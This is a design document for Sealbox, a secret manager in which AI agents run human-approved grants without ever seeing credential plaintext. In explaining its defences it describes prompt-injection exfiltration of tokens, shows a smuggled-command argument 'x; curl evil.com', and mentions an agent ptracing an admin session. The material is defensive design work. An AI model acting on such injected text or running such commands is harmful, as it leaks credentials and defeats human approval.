# Sealbox: Agent-Native Design

> Design document. Decisions are recorded separately in [`docs/adr/`](./adr/); vocabulary in
> [`CONTEXT.md`](../CONTEXT.md). This document describes how the pieces fit together.

## The principle

**An agent must be able to *use* a credential without ever *seeing* it.**

Agents introduce a threat that ordinary secret managers never had to model: **prompt injection**.
An agent reads a hostile issue and gets talked into exfiltrating the token it just fetched. No
amount of encryption-at-rest defends against that. Only one thing does — the agent never holds
the plaintext, and never chooses what to do with it.

Two consequences shape everything below:

- No interface returns a secret's value. There is no `get_secret`.
- An agent cannot compose a command. It invokes **grants** a human approved (ADR 0003).

A **grant** is a permitted use of a secret: which secrets it needs, what it does with them, and
where it runs. The relationship reads best backwards — **everything a given secret can be used
for is exactly the set of grants that declare it**, and that set is a few readable lines. In Vault,
1Password, or GitHub Secrets that set is unbounded: anyone holding the plaintext can do anything.
Collapsing "unbounded" into "a list you can read" is the product.

## Topology

This is the part that makes the rest legible. Three components, with a strict split of
responsibility (ADR 0008).

```
              ┌──────────────────────────────────────────────┐
              │  sealbox-server           hosted on Fly.io   │
              │                                              │
              │  holds:  server master key · encrypted secrets · grants      │
              │          (script bodies) · identities ·       │
              │          jobs · audit                        │
              │  does:   store · authorise · generate values  │
              │          · dispatch · record                  │
              │  NEVER:  executes anything, reaches your VPC  │
              └──────────────────────────────────────────────┘
                 ↑ long-poll (outbound)        ↑ HTTPS
                 │                             │
  ┌──────────────────────────────┐  ┌────────────────────────────────┐
  │  runner    in your cluster   │  │  CLI    your laptop · an agent │
  │                              │  │                                │
  │  does:  claim a job, receive │  │  does:  submit a job, show the │
  │         plaintext, execute,  │  │         result, admin commands │
  │         report back          │  │  NEVER: receives plaintext     │
  │  the ONLY place plaintext    │  │         executes anything      │
  │  exists outside the server   │  │                                │
  └──────────────────────────────┘  └────────────────────────────────┘
                 ↓ in-cluster SA · VPC-internal network
        ACK cluster API · RDS · OSS · GitHub
```

**The server executes nothing.** It cannot: a hosted instance has no route to an RDS inside your
VPC, and giving it one would mean exposing production to the public internet.

**The runner polls outbound**, so the cluster needs no inbound port and no public endpoint. It
also uses its in-cluster ServiceAccount, which means **there is no kubeconfig to store, ship, or
rotate** — a whole class of high-value credential simply stops existing.

**The CLI is a remote control.** It holds one identity token, submits jobs, and prints results.
It never sees a secret. Running something locally means running a local runner:

```bash
sealbox runner --name laptop         # for grants targeting your own machine
sealbox runner --name prod-cluster   # a Deployment in the cluster
```

Same binary, same subcommand. There is exactly one execution path, so there is exactly one
security model.

## The lifecycle of a secret

### 1. It comes into existence

Three origins, and **in all three the plaintext is born on the server or inside a subprocess —
never in an agent's context.**

| Origin | Command | Where the value comes from |
|---|---|---|
| Generated | `sealbox gen pg/app-password` | Server RNG. Encrypted immediately; never sent anywhere. |
| Supplied | `sealbox set openai/api-key` | Human, on stdin. Never on a command line, never in shell history. |
| Produced | `sealbox rotate <secret> --via <grant> --from-output` | The server generates the raw value and injects it as `$SEALBOX_NEW`; the grant makes some upstream accept it and prints the composed form to store. |

The third covers everything the first two cannot: a `DATABASE_URL` with a percent-encoded
password, an AWS key that only AWS can issue, a credential that must be registered upstream in
the same breath it is created. Provider-specific logic lives in the grant's script, never in
sealbox (ADR 0007).

### 2. It gets used

Only through a grant, and only on a runner:

```
agent$ sealbox run k8s-sync ns=utopia-system
```

1. CLI authenticates with its identity token and submits a **job**.
2. Server checks that this identity may run this grant, records the attempt, and queues the job
   for the runner the grant declares.
3. That runner — already long-polling — claims the job and receives the grant definition, its
   script body, and the plaintext of **exactly the secrets that grant declares**, nothing else.
4. Runner materialises them: environment variables, a `0600` temp file, or an env-file.
5. Runner executes with **argv, never a shell**, so an agent-supplied parameter of
   `x; curl evil.com` is merely an odd argument.
6. Runner reports exit code and output; the server audits it and the CLI prints it. Temp files
   are removed.

The agent's machine is never part of this. It sent a name and some parameters, and got back an
exit code.

Three injection forms, because real consumers need all three:

| Form | For |
|---|---|
| environment variable | ordinary values a program reads from the environment |
| single `0600` temp file, path substituted into argv | file-shaped credentials: docker config, SSH key, GCP service-account JSON |
| env-file — several secrets rendered `KEY=VAL` into one `0600` temp file | `kubectl create secret --from-env-file`, `docker run --env-file` |

The last two are one mechanism with different contents. The env-file form is **required** by the
acceptance scenario, not optional.

### 3. It reaches the thing that needs it

**For Kubernetes workloads: unchanged from today.** A grant writes an ordinary Kubernetes Secret
using the runner's own ServiceAccount, scoped exactly as the current `runtime-secret-writer` is.
Pods read it through `envFrom`. No sidecar, no CSI driver, no operator, no CRD, and no sealbox
credential ever reaches a Pod (ADR 0006).

```
before:  GitHub env secrets → release job → writer SA → Secret → Pod
after:   sealbox            → grant        → writer SA → Secret → Pod
                                            ^^^^^^^^^^^^^^^^^^^^^^^^ identical
```

Only the first hop changes: **where the value comes from.** Two facts come with it, neither
introduced by sealbox — a Secret update does not reach an `envFrom` Pod until it restarts, so
flows end with a `k8s-restart` grant; and Flux will not prune these Secrets, because it only
prunes resources carrying its own labels, which is already why the GitHub bridge survives today.

### 4. It gets replaced

```
sealbox rotate utopia/prod/db-password --via pg-set-password
```

Server generates a new value → a runner executes the grant with `$SEALBOX_NEW` → **the new value
is committed only if the grant exits zero.** A failed upstream push leaves the old value current.
Rotation is one command, not a browser session plus a workflow dispatch.

## Who may do what

| | admin | operator | agent | runner |
|---|---|---|---|---|
| `run` an approved grant | ✓ | ✓ | ✓ | |
| `grants`, `ls`, `audit` | ✓ | ✓ | ✓ | |
| `rotate` via an approved grant | ✓ | ✓ | ✓ | |
| `set` a secret | ✓ | ✓ | | |
| **`grant add` — approve a capability** | ✓ | | | |
| claim a job addressed to it, and receive that job's plaintext | | | | ✓ |

The runner's row is disjoint from every other: it is the only identity that receives plaintext,
and the only one that cannot ask for anything. It takes what it is given and reports back. It
cannot enumerate secrets, read one it was not sent, or start a job.

**`grant add` is the only gate, and it has no tiers** — every grant needs an admin passkey
approval (ADR 0009). An agent can draft a grant; it cannot make one runnable, and there is no
admin credential on disk for it to steal.

**What a human reviews is the capability declaration, not the script:**

```toml
[pg-provision]
secrets = ["pg/prod-admin-password"]   # ← this is what you read
```

Judging whether a shell script is safe is a hard cognitive grant, which is why that kind of review
decays into a glance. Judging one line is not. Sealbox confines the script to exactly the secrets
it declares, so however it is written it cannot reach anything else. **The capability boundary is
the real security boundary; code review never was** (ADR 0007).

Script bodies are stored in sealbox, never referenced by path — otherwise a grant approved once
could have its file edited afterwards, and what was reviewed would differ from what runs.

## Walkthroughs

### Taking over Utopia's runtime secrets

Today values live write-only in GitHub environment secrets; a release job syncs them into the
cluster; rotation means a browser plus a protected workflow dispatch.

```bash
# once, by a human
sealbox set utopia/prod/database-url                # stdin
sealbox grant add ./grants/k8s-sync.toml              # the gate

# thereafter, by anyone or any agent
sealbox run k8s-sync ns=utopia-system
```

```toml
# grants/k8s-sync.toml
[k8s-sync]
adapter = "kubernetes-secret"   # built in — no script to write, and no script to review
runner  = "prod-cluster"        # executes in the cluster, using its own ServiceAccount
config  = { namespace = "utopia-system-{env}", name = "utopia-runtime-secret-bridge" }
secrets = {
  DATABASE_URL          = "utopia/{env}/database-url",
  OSS_ENDPOINT          = "utopia/{env}/oss-endpoint",
  OSS_BUCKET            = "utopia/{env}/oss-bucket",
  CONTENT_ACCESS_SECRET = "utopia/{env}/content-access-secret"
}
```

**What a human approves here is nine lines of declaration, not a shell script.** And the adapter
is structurally incapable of anything but writing a Secret — a custom script holding the same
access could `delete ns prod` (ADR 0007).

Two things fall out. Secret synchronisation leaves the release workflow, so the two paths no
longer write the same object and **the Lease mutex can be deleted**. And the writer kubeconfig
stops existing entirely — the runner is already in the cluster, so there is nothing to store,
ship, or rotate, and the chicken-and-egg of keeping it as a GitHub secret is gone.

### Provisioning a new service, by an agent

```bash
sealbox rotate pg/newapp/database-url --via pg-provision --from-output \
    host=pgm-xxx user=newapp db=newapp
sealbox run k8s-sync    ns=utopia-system
sealbox run k8s-restart ns=utopia-system deploy=newapp
```

```toml
[pg-provision]
adapter = "postgres-role"       # built in: creates the role, composes the URL, percent-encodes
runner  = "prod-cluster"        # in the cluster, so it can reach an RDS that is not on the internet
secrets = { admin = "pg/prod-admin-password" }
```

The password is generated by the server, handed to the adapter as `$SEALBOX_NEW`, used to create
the role, and returned as a composed `DATABASE_URL` to store. Percent-encoding is the adapter's
problem, not yours.

Anything the two adapters do not cover is still possible with a script — the escape hatch stays
open, it is just no longer the default:

```bash
#!/usr/bin/env bash
set -euo pipefail          # note: generates no randomness of its own
some-provider-cli create --password "$SEALBOX_NEW" >&2
printf 'https://%s@example.com/api' "$SEALBOX_NEW"
```

A pipe or a shell inside a script is fine: it is human-approved and stored server-side. The
no-shell rule constrains **agent-supplied parameters**, which travel as argv.

The password is generated by the server, exists briefly inside one subprocess, and ends up in
Postgres and in sealbox. **The agent's transcript contains three command lines and two
acknowledgements.**

## The whole thing, as user stories

Written out as a sequence because five gaps only became visible this way — each is marked where
it falls, and each is designed to the practice its own field already settled on, not improvised.

### Act I — Standing it up (once, about half an hour)

**You bring the server up.**

```bash
fly launch && fly volumes create sealbox_data --size 1
fly secrets set SEALBOX_BOOTSTRAP_TOKEN=$(openssl rand -hex 32)   # you generate it
fly deploy
```

The bootstrap token is injected at deploy time and **never passes through logs** — logs get
shipped, retained, and read. It is accepted only while zero identities exist, only within 30
minutes of server start, exactly once, and the use is audited. Unset it afterwards. This is the
GitLab initial-root-password / Grafana admin-password convention.

**You become admin, and you back up the server master key.**

```bash
sealbox init --server https://sealbox.fly.dev --bootstrap-token <value>
# → CLI generates a recovery keypair locally; public half uploaded
# → server generates the server master key and stores it encrypted under it
# → your recovery key is displayed ONCE; you must type it back to finish
# → browser opens; Touch ID registers your passkey
```

The server master key is never displayed or logged (ADR 0010). The recovery keypair is just a master key with
`server_held = 0` — the cold path from ADR 0001, reused rather than reinvented. The forced
re-entry is deliberate: an unverified backup is not a backup.

**You put a runner in the cluster.**

```bash
sealbox identity create prod-cluster --role runner   # → join token, 15 min, single use
kubectl -n sealbox create secret generic sealbox-join --from-literal=token=<token>
kubectl apply -f runner-deployment.yaml
```

The runner generates its own keypair on first start, registers the public half using the join
token, and authenticates by signature from then on — the GitHub Actions / Buildkite runner
pattern. **The join token expires in fifteen minutes, so the Secret you just created becomes
worthless**, which is what makes this one manual step acceptable. The chicken-and-egg has to be
broken somewhere; it is broken here, deliberately and visibly.

*(A stronger form — Kubernetes TokenReview against projected ServiceAccount tokens, with no
pre-shared secret at all — would require the server to reach the cluster API, contradicting the
topology. Join tokens are the right balance.)*

**You move your credentials in.**

```bash
sealbox admin                    # one Touch ID for the whole session
> set utopia/prod/database-url   # value on stdin
> set pg/prod-admin-password
> exit                           # session lives in process memory, dies with it
rm -rf ~/.utopia-secrets
```

Success criterion #1 met.

### Act II — Every day

**You grant the first capability.** An agent drafts it by imitating `examples/grants/`; you run
`sealbox grant add`, a browser (or your phone) opens, and you approve nine lines of declaration
— rendered by the server, so an agent cannot show one thing and submit another.

**An agent works.** `sealbox run k8s-sync ns=utopia-system env=prod` — the CLI submits a job, the
runner claims it, plaintext exists only in the cluster, the agent gets an exit code.

**You rotate a database password.**

```bash
sealbox rotate utopia/prod/db-password --via rotate-utopia-db
```

This is the gap that a naive design gets wrong: changing the password is one third of the job,
and the third that breaks production on its own. The `postgres-role` adapter therefore creates a
*second* role rather than mutating the first, and the server runs a linear chain — sync, restart,
**verify**, then drop the old role (ADR 0011). Any failure leaves the old credential working.

### Act III — Working with others, and when things break

**A colleague joins.** `sealbox identity create alice --role operator` produces a single-use
invite, valid 24 hours, **bound to that named identity**. The link is an entry point, not a
credential: it grants only the right to register a passkey, carries no data access, is fully
audited, and is revocable instantly. Intercepted, it yields "register as alice" — and alice
noticing she never received it is the detection. This is the Tailscale / 1Password / Vercel
convention.

Alice can `set` and `run`. She cannot `grant add` — the power to widen the capability boundary
does not spread.

**An agent hits a wall.** No grant exists for what it needs. The skill file's rule: draft a grant
for a human to approve; do not go looking for plaintext.

**Something goes wrong.**

```bash
sealbox audit --since 24h
sealbox ls --uses pg/prod-admin-password
  → pg-provision
  → rotate-utopia-db
```

Two lines: everything that credential can do in this system. In GitHub Secrets the answer is
"anything".

**You revoke.** `sealbox identity revoke agent-laptop` — immediate, and nobody else is affected.
That is what identities are for.

**You recover.** New Fly instance on the same domain, restore the server master key from the recovery blob with
your recovery key, `litestream restore` the database. Passkeys still work (WebAuthn binds to the
domain), and the runner reconnects on its own.

## The security boundary, stated honestly

**Stops, completely:**

- A credential appearing in an agent's context, transcript, or a model provider's logs. No
  interface returns a value, and the agent's host never holds plaintext at all.
- An injected agent doing anything outside the commands a human wrote down. It cannot compose a
  command, and it cannot approve a new one.
- One compromised grant reaching credentials it did not declare.
- Plaintext sitting in a config file, a `.env`, or a shell profile.
- An agent fabricating a result: outcomes are reported by the runner, which the agent is not on
  the path of.

**Does not stop:**

- **An agent that ptraces a live `sealbox admin` session.** There is no admin credential on disk
  to steal (ADR 0009), but an in-memory session on a shared machine can be read from another
  process at the same uid. Deliberate attack, and it requires a session to be open at that moment
  — not the accidental leakage or post-injection abuse this design targets. Approving from a
  phone removes even this.

- **Compromise of the runner's host.** The runner holds plaintext for the grants it executes, so
  taking the cluster means taking the credentials that flow through it. Confined to jobs addressed
  to that runner — it cannot enumerate or read arbitrary secrets — so the exposure is what it
  runs, not the store. Separate runners with separate scopes narrow it further.

- **A malicious approved grant.** Approval is the trust boundary. A grant that declares
  `pg/prod-admin-password` can do anything that credential permits. This is what reviewing the
  declaration is for.

## Deployment

Two units, and they are asymmetric on purpose.

**Server: one instance on Fly.io** (~$2/month; a 256MB shared-CPU machine plus a 1GB volume). A
Dockerfile already exists; the volume holds the SQLite database and the server master key. No machine to patch,
no firewall, no renewal. Cloudflare Workers cannot host this — **Workers cannot spawn processes**
— but with the runner model the server does not spawn anything either, so a Workers port becomes
conceivable later. It is still not worth a rewrite.

**Runner: a Deployment in the cluster.** Needs no inbound port, no public endpoint, no Ingress —
it dials out. Its ServiceAccount is its entire authority over the cluster: scope it exactly as
`runtime-secret-writer` is scoped today. A second runner with a narrower ServiceAccount is the way
to reduce blast radius later, not a permissions system inside sealbox.

**Storage: SQLite, and it stays that way.** Writes are rare, reads are cacheable, the dataset is
megabytes, and the only growing table is append-only audit. Litestream replicates to R2 or OSS
with zero code changes. Postgres would buy nothing and cost the single-binary property.

**Recovery is mandatory, because sealbox holds the only copy.** Plaintext never leaves it, so
nobody has a backup by accident.

| | |
|---|---|
| SQLite | Litestream, continuously, to object storage |
| Server master key | offline backup — 1Password, a USB key. **Never only on the Fly volume.** |
| Restore | new instance + server master key + pull the database. Minutes. |

The cold path (ADR 0001) is the second line: secrets encrypted under a master key the server does
not hold are readable only with an offline private key. Use it for root credentials that should
survive the server itself being compromised.

## MVP

**One closed loop: sealbox becomes the source of truth for Utopia's runtime secrets, and an agent
provisions a new service end to end without learning a single password.**

1. **Server on Fly.io** — server master key and SQLite on the volume, Litestream to object storage. Includes
   the initialisation ceremony: deploy-time bootstrap token (never logged, single use, time-boxed,
   zero-identity only) and recovery-keypair master-key backup with **mandatory re-entry verification**
   (ADR 0010).
2. **`identities`** — one per human, per agent, and per runner, with a role, revocable. Humans
   authenticate with a passkey; agents and runners hold bearer tokens, because they have no
   fingers. Includes the two enrolment flows: **single-use 24h invites bound to a named identity**
   for humans, and **15-minute join tokens exchanged for a self-generated keypair** for runners,
   so the Secret holding a join token is worthless minutes later. Required the moment the server is shared: it makes audit meaningful, and lets one
   person's access be withdrawn without rotating everyone's.
3. **`sealbox set` and `sealbox gen`.**
4. **Grants stored server-side**, with parameters, a declared runner, and all three injection
   forms; argv execution, never a shell. A grant's implementation is a **built-in adapter** or a
   stored script (ADR 0007). MVP ships exactly two adapters — **`kubernetes-secret`** and
   **`postgres-role`** — which are what the acceptance scenarios need. Growth rule: an adapter is
   built in only once it would replace two scripts that actually exist. Rotation-capable adapters
   must implement **create-new-then-drop-old**, and grants may declare a linear `then` chain that
   the server runs stop-on-failure (ADR 0011).
5. **`jobs` queue and `sealbox runner`** — one table, claim-and-report, a timeout that marks
   abandoned jobs failed. **No automatic retries**: grants are not necessarily idempotent, and
   silently re-running a `CREATE USER` or a deployment is worse than failing.
6. **`sealbox run <grant> [args]`** — submit a job, wait, print the result.
7. **`sealbox rotate <secret> --via <grant> [--from-output]`**, committing only on grant success.
8. **`audit` table and `sealbox audit`.**
9. **Passkey authentication for every admin operation** (ADR 0009) — a server-rendered approval
   page, no admin credential on disk, and an in-memory `sealbox admin` session so bulk import is
   one fingerprint rather than fifty.
10. **One skill file, plus `examples/grants/`** — worked examples are the template library, and are
   what lets an agent write a correct new grant by imitation.

Before any of it, four cleanups that stand on their own merits:

- Delete `RotateMasterKeyPayload.old_private_key_pem` — it requires clients to POST a private key
  in the clear.
- Move `rusqlite::Connection` out of the repo traits; drop `conn_pool.lock()` from handlers.
- Delete `sealbox-web` and the CORS layer (ADR 0004).
- Rename `rotate_master_key` → `rekey`; `rotate` now means replacing a *value*.

### Success criteria

Falsifiable, or it is not a criterion:

1. Utopia's dev and production runtime Secrets are supplied by sealbox; the GitHub environment
   secrets are emptied.
2. One complete new-service provisioning is carried out by an agent, and the transcript contains
   no credential.
3. **Thirty consecutive days without going around sealbox once.**

The third is the real test. A tool is judged by whether it gets used when things are on fire. If
a 2am outage ends with a password pasted into a terminal, sealbox has failed — and the failure
will be rationalised as "this time was special" rather than recorded. Count it honestly.

### Not in the MVP

Leases, the egress proxy, an import command (`for f in ...; do sealbox set ...; done` suffices),
the web UI, retries and scheduling in the job queue, more than one runner, and any
provider-specific or Kubernetes-specific code inside sealbox — `k8s-sync` is an ordinary grant,
which is the proof the design is right.

## Later, in rough order

- Polish driven by actual daily use.
- Additional runners with narrower ServiceAccounts, to shrink the blast radius of a compromised
  cluster — the answer to finer permissions is another runner, not a policy engine inside sealbox.
- Dynamic credentials, starting with the Kubernetes TokenRequest API: short-lived,
  audience-scoped ServiceAccount tokens are native dynamic secrets needing no Vault and no
  per-provider adapter.
- Egress proxy — an agent sends `sealbox-ref:github-token` and the proxy substitutes the real
  credential outbound, with destination allowlisting. The strongest form of "use without seeing",
  and the largest piece of work.
- Multi-tenancy, if it is ever sold. One SQLite file per tenant, not shared Postgres tables:
  natural isolation, independent backups, independent server master keys.

## Positioning

The alternatives cost too much to adopt: Vault wants unsealing, policy HCL, an auth backend and a
storage backend; External Secrets Operator wants an operator, CRDs and a SecretStore; Sealed
Secrets wants a controller, `kubeseal` and a rotation ritual. everxyz/Utopia#695 measured that
cost precisely — retiring ESO and KMS deleted 771 lines, including a 379-line key-name verifier
and a 162-line manifest checker.

Low adoption cost is how sealbox gets tried. It is **not** a moat: anything that is merely "a
simpler X" loses users as they grow, and simplicity cannot be marketed because it is negative
space. What holds users is what the others cannot do at all — credentials that agents use without
seeing, confined to commands a human wrote down.

Both legs are required. Either alone falls over.
